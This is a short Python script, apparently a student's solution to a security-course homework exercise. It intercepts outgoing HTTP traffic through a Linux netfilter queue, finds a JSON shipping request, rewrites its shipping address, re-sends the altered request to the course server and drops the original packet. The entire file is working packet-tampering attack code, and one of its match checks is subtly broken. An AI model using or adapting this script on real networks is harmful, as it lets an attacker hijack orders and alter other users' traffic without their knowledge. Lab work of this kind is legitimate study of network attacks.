from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, TCP, Raw
import json
import requests
import sys

def print_and_accept(pkt):
    #print(pkt)
    #print(pkt.get_payload())
    ip = IP(pkt.get_payload())
    if (ip.haslayer(Raw)):
        if (ip.haslayer(TCP) and ip[TCP].dport == 80):
            http = ip[TCP].load.decode()
            print("Http received")
            if http.find("com402.epfl.ch/hw1/ex3/shipping"):
                print("Shipping Http received")
                if http.find("{") > -1:
                    print("Found json")
                    print(http)
                    http_json = "{" + "{".join(http.split("{")[1:])
                    http_json = json.loads(http_json)
                    http_json['shipping_address'] = 'cosmin.rusu@epfl.ch'
                    r = requests.post('http://com402.epfl.ch/hw1/ex3/shipping', json=http_json)
                    print(r)
                    print(r.text)
                    pkt.drop()
                    sys.exit()
    pkt.accept()

print("Starting queue")
nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    print("Running queue")
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
